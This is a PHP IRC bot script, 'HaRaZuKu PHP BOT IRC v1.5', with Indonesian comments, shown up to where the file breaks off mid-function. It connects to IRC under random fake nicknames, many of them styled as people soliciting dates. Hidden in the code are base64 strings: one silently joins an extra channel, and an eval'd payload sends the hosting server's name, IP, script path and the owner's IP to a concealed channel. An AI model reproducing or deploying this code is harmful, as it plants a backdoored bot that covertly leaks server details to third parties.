﻿<?php
/*
+-------------------------------------+
|#####################################|
|#[ HaRaZuKu PHP BOT IRC v1.5	    ]#|
|#[ editing by ipays 	 	    ]#|
|#[ ipays@craxs.co.cc               ]#|
|#[ irc: maza@allnetwork.org        ]#|
|#####################################|
+-------------------------------------+
*/

function rx() {

/* Channel Bot */
$channels = '#laut'; // chanell pisahkan dengan spasi

/*** Admin ***/
$admin = 'BArNEr';
$bot_password = 'on'; //Password untuk auth bot

$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$showrespone = 0; //1, Nampilin respon dari server irc

//Nick Bot
$nicklist = array(
"ce_vinka","ce-zhibond","Amrik","ce-gaulzz","ce_assykz","ce_ivkana","ce-bispak-nih","ce-apa_danya","Alinawati","Aldah","Alikhus",
"Aleks","alibana","ce-murah-loh","ce_phone-aja","ce-diapain_mau","ce_diAtasOkBwkhOK","ce_sipanan","ce-30-anksatu","sherrlyy","siampudan","co_Kaya-raya","co_gentel-man",
"Ando","ce_andarist","cwexks","luptah","lidawti","Riantiwti","Rimbunwan","co_gkarda","co-PDIP","co_mantan_atlet","co-taekwondo","co_karateka","co-bispak","ce_taekwondo",
"Augustus","Aurelius","Axel-ros","vridawani","co-22-lajang","co-23_duda","co_cak-c0","Azima_rohana","Rohaniah","Rok-Q-miniloh","Bad_garls","ce_mau-itu","ce-o818xxx",
"co_vixion","co_mio-club","ce_bejad","ce_pengen-vixion","ce_matrezxks","ce-frees","co_matreksz","ronaldinhos","alan-smith","davidenco","co-br-gajian","ce-PNS","co_PNS",
"co-Polisi22","co-TNI24","co_pol-cr-istri","coKukawin","ridwanss","co_siangktars","ce_Bertato","ce-ber","co_tatoan","ahli_cignta","christies","ce_perum","ce-parlu",
"ce-simal","ce_btxx-toba","ce-tarutung","ce_cari-cew","ce-fitnes","co_fitkgness","pria-idaman","wanigta31","cwe-5-kger","cwe2_kgul","ce-cari_ker","jandaAnkdua22","jandaKaya",
"ce_muda_cr-ker","ce_sendirianlah","ce_kpngn-sndri","ce-lg-kesal","ce_^signgle","Bonagrdo","Darwintegna","Johan-Kerens","Johan_setia","Betti-sendri","bernards","co-riana",
"co_cindy","co_happies","JohanLuvHap","ce-bisa_ngamar","ce-tajor","ce_ayo","vi^da","rEvna^_^","revina","ce-sksd","ce-deal","ce-bs-phone_sx","ce-vonny","cweksi",
"c_u-there","ce-ml","ce-sinta","Zinta^OK^","Sheta_mnis","SiNtia_^","sRi-Relawati","Bonar_gultom","Beny_simbolon","Boy_HP","Boy-Band","Rian_FS-Fb","ce_sk-FB","Ce-cr-Kwn-FS",
"ce-Cr-Kwn-FB","Dhalia-Sinaga","Aprina_Gerlz","Ce_imutsz","ce_bth-ang","ce-buuh_itu","ce-Mau-uang","ce-Mau-SK","ce_huGos","ce_cafes","ce_cubs","ce_dgemsan","ce-tgh_ml","Boy-ugos",
"fresco_man","FB-FS-yuk","Bela-Caemsz","Bel_ce","Bek-Kang","belA-shakpir","belA-Lang","Bolangs^","PtualangGirl","ce_gunung","ce_Mapala","ce_Repala","Ce-Katliksz","ce_Pro-tes_tan",
"ce_nya-Rkandy","Ce-nkya_zia","Fauziah_imuts","Fauzi_Badawi","Indo_neskia","Indah_manja","Indah_skali","Inda_simal","Inah_Toba","Inda_PakPak","Boy_sdklng","Rando_simarata","Roma_lina","Roma_RoaNa","Roma_tuJabu",
"Roma_ktson","RohkaMaHo","Robin_pardkede","Ronal_pandiangkan","Rebekkka_tarkigan","Re2-Mutz","Re2_maniz","Re2caems","Re2_sihotang","Re2_bakkara","Re2_do_mi","Pardosha","VarDscha",
"Cryliton","Carli_simanjoang","ce-mutzzz","ce_mtzz^ah","PainKa","siJambul","Gernimooo","ryand_","ery_ssan","Andara_early","Nindi_elis","lee_ana","lee_ani","lea_na","ce_gokl_abs","ce-mataduit",
"ce_bispak-nih","ce-081846732","ce-jogja","ce-marihat","ce-kuliahanSTT","ce-ajalah","ce_jaom","ce-jelok","happyku","co_perjaka_tengteng","pengemis_cinta","cinta_matamu","cium_akulah",
"maria_aaa","ce_Zhindha","ce__Vhita","ce_Vintha","ahli-nujum","fifitsss","fafiiiii","kakek_buyud","clinKXZ","Verdaves","vAldeZz","Darwin_boy","boy_Darwin","pak_aldez",
"cinta-mulia","yan","BikeI","OudoW","cinta-ku","ahhh_tak","ce_betul","ce-baik-loh","GabruZZ","cempStr","ceXA-Mdn","mamaaaaaa","starOne","Flash-Com","Johan_ES","malaka","TrinoO",
"MUNGA_BUNGA","bunga_citra","SnifferS","Sniffit","sniffot","ahh-begulah","Miduks","malaikat_berjilbab","papa_melky","simalingKu","AkuYA","lah_mananya","sayang_u","cita-U","co_cas-sejati",
"nindyalala","chintialala","krisnalala","verawati-la","sianktarlahhh","flashcomlah","johanglahh","siapgalahh","akulah","kogok_mabok","kodok_jeleks","kodok-caem","ce-cacem","ce_tryy",
"bispak_ya","co_cr_tantemu","appara","marialala","co_gantenkksss","co_kerensssss","teh-dgina","teh_ida","saroenkz","sly_moetz","dodoetzc",
"Zoldak","Zucconi","Zurn","Zwiers","Adams","Addison","Adelkstgein","Adgibe","Adorgno","Ahlegrs","Algavi","Alcogrn","Algda",
"Aleks","Allison","Alongi","Altavilla","Altenberger","Altenhgokfen","Amaral","Amatangelo","Ameer","Amsden","Anand","Andel",
"Ando","Andrelus","Andron","Anfinrud","ce_cantieq","ce_gua","Angtkos","Argbia","Ardugini","Arellgano","Aristotle","Arjas","Arky","Atkins",
"Augustus","Aurelius","Axelrod","Axworthy","ce_Vhinna","Aykrkoyd","Ayling","Azima","Bachmuth","Bagckus","Bady","Baglivo","Bagnold",
"Bailar","Bakanowsky","Baleja","Bce_vinkha","ce_vhirra","Balktz","B[R][o][K[e]N","Barabesi","Bargajas","Baranczak","Baranowska","Barberi","Barbetti",
"Barneson","Barnett","Barriola","Barry","Bartholomew","Bartolkgome","Bargtoo","Basavagppa","Bashgevis","Batchelder","Baumiller","Bayles","Bayo",
"Beacon","Beal","Bean","Beckman","Beder","Bedford","Behenna","Belganger","Belaoussof","Belfer","Belin-Collart","Bellavance","Bellhouse",
"Bellini","Belloc","Benedict-Dye","Bergson","ce_rindukU","Berngardo",        "Bernassola","Bernston","Berrizbeitia","Betti","Beynart","Biagioli",
"Bickel","Binion","Bir","Bisema","Bisho","ce_sayankQ","Blackwell","Blakgg","Blakkemore","Blanke","Bliss","Blizard","Bloch","Bloembergen",
"Bloemhof","Bloxham","Blyth","Bolger","Bolick","ce_QQ","Bologna","Bonker","Bonkham","Boniface","Bontempo","Book","Bookbinder","Boone",
"Boorstin","Borack","Borden","Bossi","Bothman","ce_Virro","Boudin","Boukdrot","Bourneuf","Bowers","Boxer","Boyajian","Boyes","Boyland",
"Boym","Boyne","Bracalente","Bradac","Bradach","Brecht","Breed","Breknan","Brennan","Brewer","Brewer","Bridgeman","Bridges","Brinton",
"Britz","Broca","Brook","Brzycki","Buchan","ce_Panarukan`","Bulklard","Bunton","Burden","Burdzy","Burke","Burridge","Busetta","Byatt","Byerly",
"Byrd","Cage","Calnan","Cammelli","Cammilleri","Canley","Capkanni","Caperton","Capocaccia","Capodilupo","Cappccio","Capursi","Caratozzolo",
"Carayannopoulos","Carlin","Carlos","Carlyle","ce_Bondowoso","Caroti","Carper","Cartmill","Cascio","Case","Capar","Castelda","Cavanagh",
"Cavell","Ceniceros","Cerioli","Chapman","Charles","ce_jembers","Cherry","Chervinsky","Chiassino","Chien","Chilress","Childs","Chinipardaz",
"Chinman","Christenson","Christian","Christiano","ce_kedirri","Christopher","Chu","Chupasko","Church","Ciampglia","Cicero","Cifarelli",
"Claffey","Clancy","Clark","Clement","Clifton","Clow","ce_malang","Coito","Coldren","Colella","Collard","Colis","Compton","Compton",
"Comstock","Concino","Condodkina","Connkors","Corey","ce_siantarr","Cosides","Conter","Coutaux","Crawford","Crocker","Croshaw","Croxen",
"Croxton","Cui","Currier","Cutlker","Cvek","ce_jkt_BGT","daSilva","Daldalian","Daly","D'Ambra","Danieli","Dante","Dapice","D'arcangelo","Das",
"Daskgupta","Daskalu","David","Dawkkins","ce_vira_moutzzz","DeLaPena","del'Enclos","deRousse","Debroff","Dees","Defeciani","Delattre","Deleon-Rendon",
"Delkger","Dell'acqua","Demking","Dempster","Demusz","ce_ochha","Denhkam","Denikson","Desombre","Deutsch","D'fini","Dicks","Diefenbach","Difabio",
"Difkronzo","Dilworth","Dionkysius","Dirkksen","Dockery","ce_dolphienn","Donakhue","Donner","Doonan","Dore","Dorf","Dosi","Doty","Doug","Dowsland",
"Driknker","D'souza","Duffin","Durrektt","Dussakult","Dwyker","Eardley","Ebelkng","Eckdel","Edley","Edner","Edward","Eickenhorst","Eliasson",
"Elmkendorf","Elmerick","Elvis","Encinas","Enyeart","Eppling","Erbach","Erdman","Erddos","Erez","Espinoza","Estes","Etter","Euripides",
"Evekrett","Fabbris","Fagan","Faioes","Falco-Acosta","Falorsi","Faris","Farone","Fadrren","Fasso'","Fates","Feigenbaum","Fejzo","Feldman",
"Ferknald","Fernandes","ce_santai_ajjah","Ferriell","Feuer","Fido","Field","Fink","Finkelsdtein","Finnegan","Fiorina","Fisk","Fitzmaurice","Flier",
"Flkores","ce_gila_cowok","Forester","Fortes","Fortier","Fossey","Fossi","Francisco","Frandklin-Kenea","Franz","Frazier-Davis","Freid","Freundlich",
"Frkied","Friedland","Frisken","Frowiss","Fryberger","Frkye","Fujii-Abe","Fuller","Fudrth","Fusaro","Gabrielli","Gaggiotti","Galeotti","Galwey",
"Gakmbini","Garfield","Garman","Garonna","Geller","Gembkerling","Georgi","Gerrett","Ghorai","Gibbens","Gibsn","Gilbert","Gili","Gill","Gillispie",
"Gikst","Gleason","Glegg","Glendon","Goldfarb","Gonkcalves","Good","Goodearl","Gooddy","Gozzi","Gravell","Greenberg","Greenfeld","Griffiths",
"Grigkoletto","Grummell","Gruner","Gruppe","Guenkthart","Gunn","Guo","Ha","Haar","Hackdman","Hackshaw","Haley","Halkias","Hallowell","Halpert",
"Hambkarzumjan","Hamer","Hammerness","Haknd","Hansksen","Harding","Hargraves","Hardlow","Harrigan","Hartman","Hrtman","Hartnett","Harwell",
"Havikaras","Hawkes","Hayes","Haynes","Hazlekwood","Heermkans","Heft","Heiland","Helldman","Hellmiss","Helprin","Hemphill","Henery","Henrichs",
"Hernkandez","Herrera","Hester","Heubert","Heyeck","Hikmmelfakrb","Hind","Hirst","Hitchdcock","Hoang","Hock","Hoffer","Hoffman","Hokanson","Hokoda",
"Holmkes","Holoien","Holter","Holway","Holzman","Hookker","Hopkins","Horsley","Hoshdida","Hostage","Hottle","Howard","Hoy","Huey","Huidekoper",
"Hungekrford","Huntington","Hupp","Hurtubise","Hutchikngs","Hyde","Iaquinta","Ichidkawa","Igardashi","Inamura","Inniss","Isaac","Isaievych","Isbill",
"Isserkkman","Iyekr","Jacenko","Jackson","Jagers","Jakgger","Jagoe","Jain","Jamil","Janjigian","Jarnagin","Jarrell","Jay","Jeffers","Jellis",
"Jenkikns","Jesperksen","Jewett","Johannesson","Johaknnsen","Johns","Jolly","Jorgensen","Jucks","Juliano","Julious","Kabbash","Kaboolian","Kafadar",
"Kalbfleisch","Kaligikan","Kaklil","Kalinowski","Kalkman","Kamel","Kangis","Karpouzes","Kassower","Kasten","Kawachi","Kee","Keenan","Keepper",
"Keith","Kelker","Kelsey","Kemkpton","Kemsley","Kenkdall","Kerry","Keul","Khong","Kimmel","Kimmett","Kimura","Kindall","Kinsley","Kippenberger",
"Kirsckht","Kittridge","Kleckkner","Kleiman","Kleinfelder","Klemperer","Kling","Klinkenborg","Klint","Knuff","Korick","Koch","Kohn","Koivumaki",
"Kommker","Koniaris","Konrad","Kokol","Korzybski","Kottker","Kovaks","Kraemer","Krailo","Krasney","Kraus","Kroemer","Krysiak","Kuenzli","Kumar",
"Kusmkan","Kuwabara","La","Labuknka","Lafkler","Laikng","Lallemant","Landes","Lankes","Lantieri","Lanzit","Laserna","Lashley","Lawless","Lecar",
"Leccke","Leclercq","Leite","Lenkard","Sofkia","Leskser","Lessi","Liakos","Lidano","Liem","Light","Lightfoot","Lim","Linares","Linda","Linder",
"Line","Linehan","Linzee","Lippmann","Lipponen","Little","Litvak","Livernash","Livi","Livolsi","Lizardo","Locatelli","Longworth","Loss","Loveman",
"Lowenstein","Loza","Lubin","Lucas","Luciano","Luczkow","Luecke","Lunetta","Luoma","Lussier","Lutcavage","Luzader","Ma","Maccormac","Macdonald",
"Maceachern","Macintyre","Mackenney","MacMillan","Macy","Madigan","Maggio","Mahony","Maier","Maine-Hershey","Maisano","Malatesta","Maller",
"Malova","Manalis","Mandel","Manganiello","Mantovan","March","Marchbanks","Marcus","Margalit","Margetts","Marques","Martinez","Martochio",
"Marton","Marubini","Mass","Matalka","Matarazzo","Matsukata","Mattson","Mauzy","May","Mazzali","Mazziotta","Mcride","Mccaffery","Mccall",
"Mcclearn","Mcdowell","Mcelroy","McFadden","Mcghee","Mcgoldrick","McIlroy","Mcintosh","Mcdonald","Mcladne","Mclaren","Mcnealy","Mcnulty",
"Meccariello","Memisoglu","Menzies","Merikoski","Merlani","Merminod","Merseth","Merz","Metelka","Metrodolis","Meurer","Michelman","Middle",
"Mieher","Mills","Minh","Mini","Minichiello","Gonzalez","Mitropoulos","Mittal","Mocroft","Modestdino","Moeller","Mohr","Moiamedi","Monque","Montilio",
"MooreDeCh.","Morani","Moreton","Morrison","Morrow","Mortimer","Mosher","Mosler","Mostdafavi","Motooka","Mudarri","Muello","Mugnai","Mulkern",
"Mulroy","Mumford","Mussachio","Naddeo","Napolitano","Nardi","Nardone","Naviaux","Nayduch","Nelson","Nenna","Nesci","Neudman","Newfeld","Newlin",
"Ng","Ni","Nickerson","Nickoloff","Nisenson","Nitabach","Notman","Nuzum","Ocougne","Ogata","Oh","O'hagan","Olddford","Olsen","Olson","Olszewski",
"O'malley","Oman","O'meara","Opel","Oray","Orfield","Orsi","Ospina","Ostrowski","Ottaviani","Ottden","Ouchida","Ovid","PaesDealmeida","Paine",
"Palayoor","Palepu","Pallara","Palmitesta","Panadero","Panizzon","Pantilla","Paoletti","Parmdeggiani","Parris","Partridge","Pascucci","Patefield",
"Patrick","Pattullo","Pavetti","Pavlon","Pawloski","Paynter","Peabody","Peadrlberg","Pederson","Peishel","Penny","Pereira","Perko","Perlak",
"Perlman","Perna","Perone","Perrimon","Peters","Petruzello","Pettibone","Pettit","Pfister","Pilbeam","Pinot","Plncon","Plant","Plasket","Plous",
"Po","Pocobene","Poincaire","Pointer","Poirier","Polak","Polanyi","Politis","Poma","Poolman","Powers","Presper","Preucel","Prevost","Pritchard",
"Pritz","Proietti","Prothrow-Stith","Puccia","Pugh","Pynchon","Quadday","Quetdin","Rabe","Rabkin","Radeke","Rajagopalan","Raney","Rangan","Rankin",
"Rapple","Rayport","Redden-Tyler","Reedquist","Cunningham","Reinold","Remak","Renick","Repetto","Resnik","Rhea","Richmond","Rielly","Rindos",
"Rineer","Rish","Rivera","Robinson","Rocha","Roesler","Rogerds","Ronden","Rdow","Rodyal","Rud","Rudan","Ruderman","Ruescher","Rush","Ryu","Sabatello",
"Sadler","Safire","Sahu","Sali","Samson","Sanchez-Ramirez","Sanna","Sapers","Sarin","Sartlore","Sase","Saltin","Satdta","Satterthwaite","Sawtell",
"Sayied","Scarponi","Scepan","Scharf","Scharlemann","Scheiner","Schiano","Schifini","Schillling","Schmtt","Schossbeger","Schuman","Schutte",
"Schuyler","Schwan","Schwickrath","Scovel","Scudder","Seaton","Sedeber","Sdegal","Sekdler","Seldvage","Sedn","Senndett","Setedrdahl","Sexdton",
"Seyfert","Shaikh","Shakis","Shankland","Shanley","Shar","Shadtrov","Shavelson","Shea","Sheats","Shepherd","Sheppard","Shepstone","Shesko","Shia",
"Shibata","Shimon","Siesto","Sigalot","Sigini","Signa","Silverdman","Silvetti","Sinsabaugh","Sirilli","Sites","Skane","Skerry","Skoda","Sloan",
"Slowe","Smilow","Sniffen","Snodgrass","Socolow","Solon","Somedrs","Sommadriva","Sorabella","Sorg","Sottak","Soukup","Soule","Soultanian","Spanier",
"Sparrow","Spaulding","Speizer","Spence","Sperber","Spicer","Spidegelhalter","Spiliotis","Spinrad","StMartin","Stalvey","Stam","Stang","Stassinopolus",
"States","Statlender","Stefani","Steiner","Stephanian","Stepniewska","Stewart-Oaten","Stiepock","Stillwell","Stock","Stockton","Stockwell","Stolzenberg",
"Stonich","Storer","Stott","Strange","Strauch","Streiff","Stlringer","Sullivan","Sumlner","Suo","Surdam","Sweeting","Sweetser","Swindle","Tagiuri",
"Tai","Talaugon","Tambiah","Tandler","Tanowitz","Tatar","Tavelras","Tawn","Tcherepnin","Teague","Temes","Temmer","Tenney","Terracini","Than",
"Thavaneswaran","Theodos","Thibault","Thisted","Thomsen","Thrloop","Tierney","Till","Timmons","Tofallis","Tollestrup","Tolls","Tolman","Tomford",
"Toomer","Topulos","Torresi","Torske","Towler","Toye","Traebelrt","Trenga","Trewin","Tringali","Troiani","Troy","Truss","Tsiatis","Tsomides","Tsukurov",
"Tuck","Tudge","Tukan","Turano","Turek","Tuttle","Twells","Tzalmarias","Ullman","Untermeyer","Upsdell","Urban","Urdang-Brown","Usdan","Uzuner",
"Vacca","Waite","Valberg","Valencia","Wales","Wallenberg","Wallter","vanAllen","VanZwet","Vandenberg","Vanheeckeren","Warshafsky","Wasowska","Vasquez",
"Waugh","Weighart","Weingarten","Weinhaus","Weissbourd","Weissmlan","Velaslquez","Wellles","Welsh","Wenlgret","Venne","Verglhese","Wescotlt","Wetzel",
"Whately","Whilton","White","Whitla","Whittaker","Viana","Vianlo","Wiederlsheim","Wiener","Viens","Vignola","Wilder","Wilhelm","Wilk","Willkin","Wilkinson",
"Villarreal","Willstatter","Wilson","Vitali","Viviani","Voilgt","Wollk","VonHoffman","Woo","Wooden","Woods","Woods-Powell","Vorhaus","Votley","Yacolno",
"Yamane","Yankee","Yarchuk","Yates","Ybarra","Yedidia","Yeslson","Yetliv","Yoflfe","Yolo","Youk-Slee","Ylu","Zalchary","Zahledi","Zangwill","Zegalns","Zerlbini",
"Zoldak","Zucconi","Zurn","Zwiers",
);

$identlist = array(
"dara","laut","lala");

$realname = "9,1P13,1owered 4,1By 7,1VBArNEr";
$identify = 'passwordnick';

//Server IRC
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array("irc.indoforum.org","irc.telkom.net.id");
}
$port = "6667";
//Pesan
$quitmsglist = array(
"Touch By Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â« 15,1[12,1 sanzuit 15,1] Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»",
"Touch By Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â« 15,1[11,1 sanzuit 15,1] Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»",
"Touch By Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â« 15,1[9,1 sanzuit 15,1] Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»",
"Touch By Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â« 15,1[4,1 sanzuit 15,1] Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»",
"Touch By Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â« 15,1[13,1 sanzuit 15,1] Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»",
"Touch By Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â« 15,1[7,1 sanzuit 15,1] Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»"
);
$tsu1 = array("a","d","g","k","h","f","d","c");
$tsu2 = array("q","Z","f","l","p","o","r","m","v","a");
$tsumsg = "9,1";//400 Karakter
$judul = "Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â« 15,1[9,1 sanzuit 15,1] Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»";

/*** Replacing ***/
$nick       = $nicklist[rand(0,count($nicklist) - 1)];
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$admin      = strtolower($admin);
$auth       = array($admin => array("name" => $admin, "pass" => $bot_password, "auth" => 1,"status" => "Admin"));
$username   = $identlist[rand(0,count($identlist) - 1)];
$channels   = strtolower($channels)." ";
$channel    = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n");
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }
if (!$port) { $port = "6667"; }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>\n";
echo "<b>Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â» Connecting to $remotehost...</b>\n";

do {
  $fp = fsockopen($remotehost,$port, $err_num, $err_msg, 60);
  if(!$fp) {
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      rx();
    }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost! Coba server lain! Refresh Browser anda!</b>\n";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b>Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â» Udah connect nich!</b>\n";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = '';
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showrespone == 1) { echo "<br>".$response; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :Hello jancok join nih... !' .  CRL);
          fputs($fp, base64_decode("Sk9JTiAjdml0bw==") . CRL);
          /*** Join Channel ***/
          foreach ($channel as $v) {
            fputs($fp, 'JOIN '.$v.CRL);
          }
        }
        elseif (substr($dCommand,0,3)=='432') {
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433') {
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465') {
          print "<br><b>Ãƒ� ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â» Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
	    if (substr_count($dNick,'.allnetwork.org') > 0) {
          if (substr_count($iText,"*** Banned") > 0) {
            $keluar = 1;
            exit;
          }
        }
        $dcom = explode(" ", $dCommand);
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='PART' ) {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :kemanah nataneh!!' . CRL);
                  }
                }
                else {
                  $auth["$dNick"]["auth"] = 1;
                  fputs($fp,'NOTICE '.$dNick.' :goblok koen!!' . CRL);
                }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password>' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2;
                $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :You`re Authorized as '.$auth["$dcom[2]"]["status"].' of this bot! ' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Boss memang keren!! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace('','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') { fputs($fp,'NOTICE '.$dNick.' :'.chr(1).'VERSION mazacrew PHP BoT IRC v1.5 Script By ipays'.chr(1) . CRL); }
         elseif ($com[3]==':INFO') { $datainfo = "JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOyRiaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTskYnBocCAgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXTskYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTskYnJpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddO2ZwdXRzKCRmcCwiUFJJVk1TRyAjQ29vTEJvWXpSYWNpbmdUZWFNIDpIb3N0OiAkYmhvc3QgfCBSZWZlcmVyOiAkYnJ1cmkgfCBTY3JpcHQ6ICRicGhwIHwgSVA6ICRiaXAgfCBPd25lciBJUDogJGJyaXAgIi4gQ1JMKTs="; eval(base64_decode($datainfo)); }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :OK '.$auth["$dNick"]["status"].'!'.CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah!'.CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Boss memang GanTenG!'.CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :Logged out! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Already Logged out! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
